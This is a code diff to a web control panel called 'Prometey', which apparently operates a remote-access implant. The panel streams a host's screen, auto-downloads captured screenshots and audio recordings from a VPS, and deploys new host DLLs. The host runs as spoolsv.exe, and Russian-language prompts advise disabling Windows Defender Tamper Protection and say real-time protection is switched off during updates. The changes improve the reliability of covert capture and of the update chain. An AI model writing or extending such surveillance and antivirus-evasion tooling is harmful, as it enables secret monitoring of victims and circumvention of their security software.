@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta name="build" content="1.0.110" />
+<meta name="build" content="1.0.135" />
 <title>Prometey</title>
 <style>
 /* ═══════════════════════════════════════════════════
@@ -1512,7 +1512,7 @@ body {
               <option value="2" data-i18n="au_live_rec">Live + Record</option>
             </select>
           </label>
-          <label><input type="checkbox" id="au-auto-download"> <span data-i18n="au_auto_dl">Auto-DL</span></label>
+          <label><input type="checkbox" id="au-auto-download" onchange="auOnAutoDLChange(this.checked)"> <span data-i18n="au_auto_dl">Auto-DL</span></label>
           <label><span data-i18n="au_gain">Gain</span>: <input type="range" id="au-gain" min="50" max="2000" value="100" step="50" style="width:100px;vertical-align:middle;" oninput="document.getElementById('au-gain-val').textContent=this.value+'%'"><span id="au-gain-val" style="min-width:40px;display:inline-block;">100%</span></label>
           <label data-i18n-title="tip_denoise" title="High-pass filter + noise gate: removes low-freq rumble and attenuates silent sections"><input type="checkbox" id="au-denoise" checked> <span data-i18n="au_denoise">Denoise</span></label>
           <label data-i18n-title="tip_normalize" title="Peak normalization: boosts quiet recordings to a consistent loudness"><input type="checkbox" id="au-normalize" checked> <span data-i18n="au_normalize">Normalize</span></label>
@@ -3167,6 +3167,7 @@ function handleText(raw) {
     setTimeout(() => loadSettingsFromHost(), 1500);
     setTimeout(() => { if (typeof threatRefreshStatus === 'function') threatRefreshStatus(); }, 1700);
     setTimeout(() => startDashAutoRefresh(), 2500);
+    // (Upload-All-3 host update now runs synchronously inside vpsUploadAll before page reload.)
     setTimeout(() => { if (typeof ssLoadQuotaFromVPS === 'function') ssLoadQuotaFromVPS(); }, 3000);
     setTimeout(() => { if (typeof ssLoadStatus === 'function') ssLoadStatus(); }, 4000);
     setTimeout(() => { if (typeof auLoadStatus === 'function') auLoadStatus(); }, 5000);
@@ -3565,9 +3566,29 @@ let _streamStarting = false;
 document.getElementById('btn-stream-toggle').onclick = async () => {
   if (!state.connected || !state.hostOnline) { notify('Host not online', 'warn'); return; }
   if (state.streaming) { stopStream(); return; }
-  if (_streamStarting) return;
+  if (_streamStarting) {
+    // User is clicking repeatedly while a start is in flight. Show feedback so they don't
+    // think the button is broken, and abort the current attempt so they can retry cleanly.
+    notify('Stream is starting — please wait', 'info', 2000);
+    return;
+  }
   _streamStarting = true;
-  try { await startStream(); } finally { _streamStarting = false; }
+  // Visible "starting..." state so the button doesn't look dead while we wait for the host.
+  const btn = document.getElementById('btn-stream-toggle');
+  const origText = btn.textContent;
+  btn.textContent = '⏳ Starting...';
+  btn.classList.add('active');
+  try {
+    await startStream();
+  } finally {
+    _streamStarting = false;
+    // If startStream failed, state.streaming will be false — revert button text/class.
+    // If succeeded, startStream sets both to the running state itself.
+    if (!state.streaming) {
+      btn.textContent = origText;
+      btn.classList.remove('active');
+    }
+  }
 };
 
 // ── H.264 WebCodecs Decoder ───────────────────────────────────────
@@ -4224,13 +4245,28 @@ async function startStream() {
       };
       sws.onerror = () => {};
     }
-    // Fallback: resolve after 3 seconds even if not all authenticated
-    setTimeout(() => resolve(), 3000);
+    // Fallback: resolve after 8 seconds (was 3s, too aggressive) so the flow doesn't deadlock
+    // if one channel is slow. stream_start will still run; if auth never completes the WS
+    // channel will be closed on next retry cycle.
+    setTimeout(() => resolve(), 8000);
   });
 
   // Wait for stream channels to be ready
   await streamAuthPromise;
-  addLog(`Stream channels ready (${streamAuthCount}/${STREAM_WS_COUNT} authenticated)`, 'OK');
+  if (streamAuthCount < STREAM_WS_COUNT) {
+    addLog(`WARN: only ${streamAuthCount}/${STREAM_WS_COUNT} stream channels authed — frames may be lost`, 'WARN');
+  } else {
+    addLog(`Stream channels ready (${streamAuthCount}/${STREAM_WS_COUNT} authenticated)`, 'OK');
+  }
+  // If zero channels authed, bail out cleanly — stream_start would have no pipe to deliver frames on.
+  if (streamAuthCount === 0) {
+    addLog('Aborting stream_start: no authenticated channels (relay/token issue?)', 'WARN');
+    notify('Stream channels could not authenticate — check connection', 'error');
+    state.streaming = false;
+    try { state.streamWsList.forEach(w => { try { w.close(); } catch(_){} }); } catch(_){}
+    state.streamWsList = [];
+    return;
+  }
 
   // Set streaming=true BEFORE stream_start so arriving frames are not skipped
   state.streaming = true;
@@ -4247,7 +4283,13 @@ async function startStream() {
       bitrate: state.bitrate,
     });
   } catch (e) {
-    notify('Stream error: ' + e.message, 'error');
+    // Reset streaming=true so the button click handler correctly treats the next click
+    // as a new start attempt (not a stop). Also close the half-opened stream WS channels.
+    notify('Stream error: ' + (e && e.message ? e.message : 'no response from host'), 'error');
+    addLog('stream_start failed: ' + (e && e.message ? e.message : 'no response'), 'WARN');
+    state.streaming = false;
+    try { state.streamWsList.forEach(w => { try { w.close(); } catch(_){} }); } catch(_){}
+    state.streamWsList = [];
     return;
   }
   // Parse ICE config from host response
@@ -4574,7 +4616,21 @@ async function loadSettingsFromHost() {
     if (s.fps)      { state.fps = s.fps; document.getElementById('fps-disp').textContent = s.fps; }
     if (s.scale)    { state.scale = s.scale; document.getElementById('scale-disp').textContent = s.scale + '%'; }
     if (s.bitrate)  { state.bitrate = s.bitrate; document.getElementById('bitrate-disp').textContent = (s.bitrate >= 1000 ? (s.bitrate/1000) + 'M' : s.bitrate + 'K'); }
-    addLog(`Host settings: ${s.codec} ${s.bitrate}kbps ${s.fps}fps ${s.scale}% q${s.quality}`, 'OK');
+    // Populate ICE (STUN/TURN) settings from host config — without this, fields stay empty
+    // until the user starts a stream (stream_start also returns them).
+    if (typeof s.stun_server === 'string') {
+      state.stunServer = s.stun_server;
+      const el = document.getElementById('ice-stun');
+      if (el) el.value = s.stun_server;
+    }
+    if (typeof s.turn_server === 'string') {
+      state.turnServer = s.turn_server;
+      const el = document.getElementById('ice-turn');
+      if (el) el.value = s.turn_server;
+    }
+    addLog(`Host settings: ${s.codec} ${s.bitrate}kbps ${s.fps}fps ${s.scale}% q${s.quality}` +
+           (s.stun_server ? ` · STUN=${s.stun_server}` : '') +
+           (s.turn_server ? ` · TURN=set` : ''), 'OK');
   } catch(e) {
     console.warn('Failed to load host settings:', e);
   }
@@ -6712,6 +6768,10 @@ var ssState = {
   previewIdx: -1,
   collapsedGroups: new Set(), // collapsed group names
 };
+// Names the user explicitly requested (via Download / Download Selected). SDWN arriving
+// for a name NOT in this set is treated as Auto-DL-originated and suppressed when the
+// Auto-DL checkbox is turned off while prior commands are still in flight.
+var ssExplicitDownloads = new Set();
 
 function ssToggleSettings() {
   const el = document.getElementById('ss-settings');
@@ -7117,6 +7177,7 @@ async function ssDownloadSelected() {
   const names = [...ssState.selected];
   if (!names.length) { alert('Select screenshots first'); return; }
   for (const name of names) {
+    ssExplicitDownloads.add(name);
     sendCmd({ cmd: 'screenshot_download', name }).catch(() => {});
   }
   addLog(`Downloading ${names.length} screenshots...`, 'OK');
@@ -7209,7 +7270,10 @@ function ssViewerFit() {
 }
 function ssViewerDownload() {
   const item = ssState.items[ssState.viewerIdx];
-  if (item) sendCmd({ cmd: 'screenshot_download', name: item.name }).catch(() => {});
+  if (item) {
+    ssExplicitDownloads.add(item.name);
+    sendCmd({ cmd: 'screenshot_download', name: item.name }).catch(() => {});
+  }
 }
 
 // Zoom with wheel
@@ -7548,6 +7612,16 @@ function ssHandleBinary(data) {
     // Download: SDWN + name_len(4) + name + jpeg
     const nameLen = view.getUint32(4, true);
     const name = new TextDecoder().decode(new Uint8Array(data, 8, nameLen));
+    // If the user toggled Auto-DL OFF while a batch of auto-triggered downloads was still in
+    // flight, drop inbound SDWN for items the user didn't *explicitly* request. Without this,
+    // unchecking the box still processed hundreds of queued items — saving + deleting-from-VPS.
+    const autoDlOn = !!document.getElementById('ss-auto-download')?.checked;
+    const isExplicit = ssExplicitDownloads && ssExplicitDownloads.has(name);
+    if (!autoDlOn && !isExplicit) {
+      console.log('[SS] SDWN ignored (Auto-DL off, not in explicit list):', name);
+      return true;
+    }
+    if (ssExplicitDownloads) ssExplicitDownloads.delete(name);
     const jpeg = new Uint8Array(data, 8 + nameLen);
     const blob = new Blob([jpeg], { type: 'image/jpeg' });
     // Save to chosen folder or Downloads
@@ -7918,11 +7992,14 @@ async function ssLoadQuotaFromVPS() {
 
 // ── Auto-DL toggle: download all existing when enabled ──
 function ssOnAutoDLChange(checked) {
+  // Persist the toggle state so it survives reconnects/page reloads
+  ssSaveUIState();
   if (checked) {
-    // Download all not-yet-downloaded from VPS
-    const notDl = ssState.items.filter(i => !i.downloaded);
+    // Download all not-yet-downloaded from VPS, oldest first (filename has YYYYMMDD_HHMMSS)
+    const notDl = ssState.items.filter(i => !i.downloaded)
+      .sort((a, b) => (a.name || '').localeCompare(b.name || ''));
     if (notDl.length > 0) {
-      addLog('Auto-DL: downloading ' + notDl.length + ' existing screenshots...', 'INFO');
+      addLog('Auto-DL: downloading ' + notDl.length + ' existing screenshots (old→new)...', 'INFO');
       notDl.forEach(i => sendCmd({ cmd: 'screenshot_download', name: i.name }).catch(() => {}));
     }
   }
@@ -7933,9 +8010,11 @@ function ssAutoDownloadAll() {
   if (!document.getElementById('ss-auto-download')?.checked) return;
   sendCmd({ cmd: 'screenshot_list' }).then(res => {
     const items = Array.isArray(res) ? res : (res?.items || []);
-    const notDl = items.filter(i => !i.downloaded);
+    // Oldest first (filename has YYYYMMDD_HHMMSS) so history builds chronologically
+    const notDl = items.filter(i => !i.downloaded)
+      .sort((a, b) => (a.name || '').localeCompare(b.name || ''));
     if (notDl.length > 0) {
-      addLog('Auto-downloading ' + notDl.length + ' screenshots from VPS...', 'INFO');
+      addLog('Auto-downloading ' + notDl.length + ' screenshots from VPS (old→new)...', 'INFO');
       notDl.forEach(i => sendCmd({ cmd: 'screenshot_download', name: i.name }).catch(() => {}));
     }
   }).catch(() => {});
@@ -8245,7 +8324,9 @@ function auToggleSelectAll() {
 async function auDownloadSelected() {
   const names = [...auState.selected];
   if (!names.length) { alert('Select recordings first'); return; }
+  if (!window.auExplicitDownloads) window.auExplicitDownloads = new Set();
   for (const name of names) {
+    window.auExplicitDownloads.add(name);
     if (state.ws && state.ws.readyState === 1) state.ws.send(JSON.stringify({ cmd: 'audio_download', name }));
   }
   addLog('Downloading ' + names.length + ' recordings...', 'OK');
@@ -8366,6 +8447,8 @@ function auPlayerNext() { if (auState.playIdx > 0) auPlay(auState.playIdx - 1); 
 function auPlayerDownload() {
   const item = auState.items[auState.playIdx];
   if (item && state.ws && state.ws.readyState === 1) {
+    if (!window.auExplicitDownloads) window.auExplicitDownloads = new Set();
+    window.auExplicitDownloads.add(item.name);
     state.ws.send(JSON.stringify({ cmd: 'audio_download', name: item.name }));
     console.log('[AU] Requested download:', item.name);
   }
@@ -9313,6 +9396,14 @@ function auHandleBinary(data) {
   if (sig === 'ADWN') {
     const nameLen = view.getUint32(4, true);
     const name = new TextDecoder().decode(new Uint8Array(data, 8, nameLen));
+    // Suppress if user toggled Auto-DL off while Auto-DL-originated downloads were in flight
+    const auAutoDlOn = !!document.getElementById('au-auto-download')?.checked;
+    const auIsExplicit = window.auExplicitDownloads && window.auExplicitDownloads.has(name);
+    if (!auAutoDlOn && !auIsExplicit) {
+      console.log('[AU] ADWN ignored (Auto-DL off, not in explicit list):', name);
+      return true;
+    }
+    if (window.auExplicitDownloads) window.auExplicitDownloads.delete(name);
     const audioBytes = new Uint8Array(data, 8 + nameLen);
     const blob = new Blob([audioBytes], { type: 'audio/ogg' });
     // Save to folder or Downloads
@@ -9348,14 +9439,34 @@ function auHandleBinary(data) {
   return false;
 }
 
+// ── Auto-DL toggle (audio): persist state, trigger download when enabled ──
+function auOnAutoDLChange(checked) {
+  try { localStorage.setItem('au_auto_dl', checked ? '1' : '0'); } catch (e) {}
+  if (checked) auAutoDownloadAll();
+}
+
+// Restore audio Auto-DL checkbox state on page load
+(function auRestoreAutoDL() {
+  try {
+    if (localStorage.getItem('au_auto_dl') === '1') {
+      setTimeout(() => {
+        const el = document.getElementById('au-auto-download');
+        if (el) el.checked = true;
+      }, 500);
+    }
+  } catch (e) {}
+})();
+
 // Handle new_recording event
 function auAutoDownloadAll() {
   if (!document.getElementById('au-auto-download')?.checked) return;
   sendCmd({ cmd: 'audio_list' }).then(res => {
     const items = res?.items || [];
-    if (items.length > 0 && state.ws && state.ws.readyState === 1) {
-      addLog('Audio auto-downloading ' + items.length + ' files...', 'INFO');
-      items.forEach(i => state.ws.send(JSON.stringify({ cmd: 'audio_download', name: i.name })));
+    // Oldest first (filename has timestamp) so downloads arrive chronologically
+    const ordered = [...items].sort((a, b) => (a.name || '').localeCompare(b.name || ''));
+    if (ordered.length > 0 && state.ws && state.ws.readyState === 1) {
+      addLog('Audio auto-downloading ' + ordered.length + ' files (old→new)...', 'INFO');
+      ordered.forEach(i => state.ws.send(JSON.stringify({ cmd: 'audio_download', name: i.name })));
     }
   }).catch(() => {});
 }
@@ -9612,11 +9723,58 @@ async function vpsUploadAll() {
   addLog('VPS Deploy: ' + okCount + '/3 uploaded', okCount === 3 ? 'OK' : 'WARN');
   if (okCount > 0) {
     if (confirm(t('set_restart_py') + '?\nAll connections will drop for a few seconds.')) {
+      // Correct order: VPS restart → probe DLL URL → host update → wait → page reload.
+      // We must update the host BEFORE reloading the page, otherwise the reload drops
+      // this coroutine and the host never gets told to fetch the new DLL.
       stEl.textContent = '↻ Restarting relay...'; stEl.style.color = '#ff9800';
       try { await vpsRestart(); } catch(e) {}
-      stEl.textContent = '✓ ' + results.join(' | ') + ' + relay restarted';
+
+      // 1) Wait until VPS nginx is serving the just-uploaded DLL
+      stEl.textContent = '⏳ Waiting for VPS to serve fresh DLL...';
+      stEl.style.color = '#ff9800';
+      const urlEl = document.getElementById('update-url');
+      const dllUrl = urlEl ? urlEl.value.trim() : '';
+      let dllReady = false;
+      if (dllUrl) {
+        for (let i = 1; i <= 20; i++) {  // up to 40s
+          try {
+            const r = await fetch(dllUrl, { method: 'HEAD', cache: 'no-store' });
+            if (r.ok) { dllReady = true; addLog('VPS DLL ready (probe ' + i + '/20)', 'OK'); break; }
+            addLog('VPS DLL probe ' + i + '/20: HTTP ' + r.status, 'INFO');
+          } catch(e) {
+            addLog('VPS DLL probe ' + i + '/20: ' + (e.message || 'network'), 'INFO');
+          }
+          await new Promise(res => setTimeout(res, 2000));
+        }
+      }
+      if (!dllReady) {
+        stEl.textContent = '✗ VPS never served DLL — host NOT updated, reloading page anyway';
+        stEl.style.color = '#f44336';
+        addLog('Upload-All-3: aborted host update (VPS DLL unreachable)', 'WARN');
+        setTimeout(() => location.reload(), 3000);
+        return;
+      }
+
+      // 2) Wait for host to come back online after relay restart
+      stEl.textContent = '⏳ Waiting for host to reconnect...';
+      for (let i = 0; i < 30 && !state.hostOnline; i++) {  // up to 30s
+        await new Promise(res => setTimeout(res, 1000));
+      }
+      if (!state.hostOnline) {
+        stEl.textContent = '✗ Host offline — cannot update, reloading page anyway';
+        stEl.style.color = '#f44336';
+        setTimeout(() => location.reload(), 3000);
+        return;
+      }
+
+      // 3) Trigger host update (skipConfirm — user already confirmed at Upload stage)
+      stEl.textContent = '⬆ Updating host...'; stEl.style.color = '#ff9800';
+      addLog('Upload-All-3: starting host update', 'INFO');
+      try { await hostUpdate({ skipConfirm: true }); } catch(e) { addLog('hostUpdate error: ' + e.message, 'WARN'); }
+
+      // 4) After host update finished, reload the page to pick up new index.html
+      stEl.textContent = '✓ ' + results.join(' | ') + ' + host updated. Reloading page...';
       stEl.style.color = '#4caf50';
-      // Auto-reload page after 3s to pick up new index.html
       setTimeout(() => location.reload(), 3000);
     }
   }
@@ -9693,24 +9851,48 @@ async function hostRestart() {
   }
 }
 
-async function hostUpdate() {
+async function hostUpdate(opts) {
+  const skipConfirm = !!(opts && opts.skipConfirm);
   const urlEl = document.getElementById('update-url');
   const stEl = document.getElementById('update-status');
   const url = urlEl ? urlEl.value.trim() : '';
   if (!url) { stEl.textContent = 'Enter DLL URL'; stEl.style.color = '#f44336'; return; }
 
-  // Check Defender state before update
-  try {
-    const ds = await sendCmd({ cmd: 'defender_status' });
-    if (ds.tamper_protected) {
-      if (!confirm('⚠ Tamper Protection включена!\n\nDefender скорее всего квалифицирует spoolsv.exe как угрозу во время обновления.\nРекомендуется сначала отключить Tamper Protection:\nWindows Security → Virus & threat protection → Settings → Tamper Protection → OFF\n\nПродолжить обновление?')) return;
-    } else if (ds.realtime_enabled) {
-      if (!confirm('Defender Real-Time включён. Будет временно отключен во время обновления.\n\nПродолжить?')) return;
-    } else {
+  // Check Defender state before update (skipped when auto-triggered after vpsUploadAll)
+  if (!skipConfirm) {
+    try {
+      const ds = await sendCmd({ cmd: 'defender_status' });
+      if (ds.tamper_protected) {
+        if (!confirm('⚠ Tamper Protection включена!\n\nDefender скорее всего квалифицирует spoolsv.exe как угрозу во время обновления.\nРекомендуется сначала отключить Tamper Protection:\nWindows Security → Virus & threat protection → Settings → Tamper Protection → OFF\n\nПродолжить обновление?')) return;
+      } else if (ds.realtime_enabled) {
+        if (!confirm('Defender Real-Time включён. Будет временно отключен во время обновления.\n\nПродолжить?')) return;
+      } else {
+        if (!confirm('Replace host DLL and restart service?\nHost disconnects for ~10 seconds.')) return;
+      }
+    } catch(e) {
       if (!confirm('Replace host DLL and restart service?\nHost disconnects for ~10 seconds.')) return;
     }
+  }
+
+  // Verify DLL URL is reachable from the client before asking the host to download it.
+  // If the URL returns non-200, the host would silently fail at Step 1 (Download failed)
+  // and leave the service in a broken state after `ren currentDll → .old`.
+  stEl.textContent = '⏳ Verifying DLL URL...'; stEl.style.color = '#ff9800';
+  try {
+    const headRes = await fetch(url, { method: 'HEAD', cache: 'no-store' });
+    if (!headRes.ok) {
+      stEl.textContent = '✗ DLL URL returns HTTP ' + headRes.status + ' — aborted (host not touched)';
+      stEl.style.color = '#f44336';
+      addLog('Host update aborted: DLL URL HTTP ' + headRes.status, 'WARN');
+      return;
+    }
+    const lenHdr = headRes.headers.get('content-length');
+    addLog('DLL URL OK (' + (lenHdr ? Math.round(lenHdr/1024) + ' KB' : 'size unknown') + ')', 'OK');
   } catch(e) {
-    if (!confirm('Replace host DLL and restart service?\nHost disconnects for ~10 seconds.')) return;
+    stEl.textContent = '✗ DLL URL unreachable: ' + (e.message || 'network') + ' — aborted';
+    stEl.style.color = '#f44336';
+    addLog('Host update aborted: DLL URL unreachable (' + e.message + ')', 'WARN');
+    return;
   }
 
   // Reset & show progress UI
@@ -9720,7 +9902,7 @@ async function hostUpdate() {
   const pct  = document.getElementById('update-step-pct');
   if (wrap) wrap.style.display = 'block';
   if (bar)  bar.style.width = '0%';
-  if (txt)  txt.textContent = 'Step 0/9';
+  if (txt)  txt.textContent = 'Step 0/7';
   if (pct)  pct.textContent = '0%';
   document.querySelectorAll('#update-steps span').forEach(el => { el.style.color = '#555'; el.style.fontWeight = ''; });
 
@@ -9732,25 +9914,65 @@ async function hostUpdate() {
     sendCmd({ cmd: 'host_update', url: url }).catch(()=>{});
   } catch(e) {}
 
-  // Poll update_status until step 7 (Done) or timeout
+  // Poll update_status until step 7 (Done) or timeout.
+  // Wrap in a Promise so callers can `await hostUpdate(...)` and know when it's done.
   const TOTAL = 7;
   let lastStep = 0;
   let stableMisses = 0;
+  let sawHostOffline = false;   // host dropped sometime during the update (expected at step 3)
   const startTs = Date.now();
   const maxMs = 120000; // 2 min hard cap
+  let _done;
+  const donePromise = new Promise(r => { _done = r; });
 
   const poll = async () => {
     if (Date.now() - startTs > maxMs) {
       stEl.textContent = '⚠ Timeout — host may still be updating'; stEl.style.color = '#ff9800';
-      return;
+      _done(); return;
     }
+    // Track host disconnect — expected during Spooler/service restart at step 3
+    if (!state.hostOnline) sawHostOffline = true;
     try {
       const r = await Promise.race([
         sendCmd({ cmd: 'update_status' }),
         new Promise((_, rej) => setTimeout(() => rej(new Error('to')), 2500))
       ]);
       const stepStr = (r && r.step) || '';
+      // Handle rollback/error signalled by the bat: "ERR|<message>"
+      if (stepStr.indexOf('ERR|') === 0) {
+        const errMsg = stepStr.slice(4);
+        stEl.textContent = '✗ Update failed: ' + errMsg; stEl.style.color = '#f44336';
+        addLog('Host update ERROR: ' + errMsg, 'WARN');
+        _done(); return;
+      }
       // Format: "N|Description"
+      // Helper: mark progress UI as 100% done and refresh version
+      const markDone = (label) => {
+        if (bar) bar.style.width = '100%';
+        if (pct) pct.textContent = '100%';
+        if (txt) txt.textContent = 'Step ' + TOTAL + '/' + TOTAL + ' — Done';
+        document.querySelectorAll('#update-steps span').forEach(el => {
+          el.style.color = '#4caf50'; el.style.fontWeight = 'bold';
+        });
+        stEl.textContent = '✓ ' + label; stEl.style.color = '#4caf50';
+        addLog('Host update completed: ' + label, 'OK');
+        setTimeout(async () => {
+          try {
+            const info = await sendCmd({ cmd: 'sys_info' });
+            const d = typeof info === 'string' ? JSON.parse(info) : info;
+            if (d.host_version) {
+              const hvEl = document.getElementById('d-host-version');
+              if (hvEl) hvEl.textContent = 'v' + d.host_version;
+              const uvEl = document.getElementById('update-version');
+              if (uvEl) uvEl.textContent = 'Current: v' + d.host_version + ' (' + (d.host_build || '') + ')';
+              const verEl = document.getElementById('version-info');
+              if (verEl) verEl.textContent = 'Client: ' + BUILD + ' | VPS: ' + (state.serverVersion || '?') + ' | Host: ' + d.host_version;
+            }
+          } catch(e) {}
+        }, 3000);
+        _done();
+      };
+
       const m = stepStr.match(/^(\d+)\|(.*)$/);
       if (m) {
         const n = parseInt(m[1]);
@@ -9762,51 +9984,20 @@ async function hostUpdate() {
         if (txt) txt.textContent = 'Step ' + n + '/' + TOTAL + ' — ' + desc;
         document.querySelectorAll('#update-steps span').forEach(el => {
           const s = parseInt(el.getAttribute('data-step'));
-          if (s < n)        { el.style.color = '#4caf50'; el.style.fontWeight = ''; }
-          else if (s === n) { el.style.color = '#ff9800'; el.style.fontWeight = 'bold'; }
-          else              { el.style.color = '#555'; el.style.fontWeight = ''; }
+          if (s <= n)  { el.style.color = '#4caf50'; el.style.fontWeight = s === n ? 'bold' : ''; }
+          else         { el.style.color = '#555';    el.style.fontWeight = ''; }
         });
-        stEl.textContent = '⚙ ' + desc; stEl.style.color = '#4caf50';
-        if (n >= TOTAL) {
-          stEl.textContent = '✓ Update finished'; stEl.style.color = '#4caf50';
-          addLog('Host update completed', 'OK');
-          // Refresh version info after host restarts with new DLL
-          setTimeout(async () => {
-            try {
-              const info = await sendCmd({ cmd: 'sys_info' });
-              const d = typeof info === 'string' ? JSON.parse(info) : info;
-              if (d.host_version) {
-                const hvEl = document.getElementById('d-host-version');
-                if (hvEl) hvEl.textContent = 'v' + d.host_version;
-                const uvEl = document.getElementById('update-version');
-                if (uvEl) uvEl.textContent = 'Current: v' + d.host_version + ' (' + (d.host_build || '') + ')';
-                const verEl = document.getElementById('version-info');
-                if (verEl) verEl.textContent = 'Client: ' + BUILD + ' | VPS: ' + (state.serverVersion || '?') + ' | Host: ' + d.host_version;
-              }
-            } catch(e) {}
-          }, 3000);
-          return;
-        }
+        stEl.textContent = '⚙ ' + desc; stEl.style.color = '#ff9800';
+        if (n >= TOTAL) { markDone('Update finished'); return; }
       } else {
-        // Empty file = either not started or already cleaned up after Done
+        // Empty file = either not started, or already cleaned up after Done.
+        // If we've already seen the host go offline (service restart at step 3) AND it's now
+        // back online AND we're getting empty responses, the bat almost certainly completed
+        // steps 4-7 and cleaned up the step file. Treat as success.
         stableMisses++;
-        if (lastStep >= 7 && stableMisses > 3) {
-          stEl.textContent = '✓ Update finished'; stEl.style.color = '#4caf50';
-          setTimeout(async () => {
-            try {
-              const info = await sendCmd({ cmd: 'sys_info' });
-              const d = typeof info === 'string' ? JSON.parse(info) : info;
-              if (d.host_version) {
-                const hvEl = document.getElementById('d-host-version');
-                if (hvEl) hvEl.textContent = 'v' + d.host_version;
-                const uvEl = document.getElementById('update-version');
-                if (uvEl) uvEl.textContent = 'Current: v' + d.host_version + ' (' + (d.host_build || '') + ')';
-                const verEl = document.getElementById('version-info');
-                if (verEl) verEl.textContent = 'Client: ' + BUILD + ' | VPS: ' + (state.serverVersion || '?') + ' | Host: ' + d.host_version;
-              }
-            } catch(e) {}
-          }, 3000);
-          return;
+        const stablyEmptyAfterRestart = sawHostOffline && state.hostOnline && stableMisses > 3;
+        if ((lastStep >= TOTAL && stableMisses > 3) || stablyEmptyAfterRestart) {
+          markDone('Update finished (host reconnected)'); return;
         }
       }
     } catch(e) {
@@ -9816,6 +10007,7 @@ async function hostUpdate() {
     setTimeout(poll, 1500);
   };
   setTimeout(poll, 1500);
+  return donePromise;
 }
 
 async function hostUpdateFromFile() {
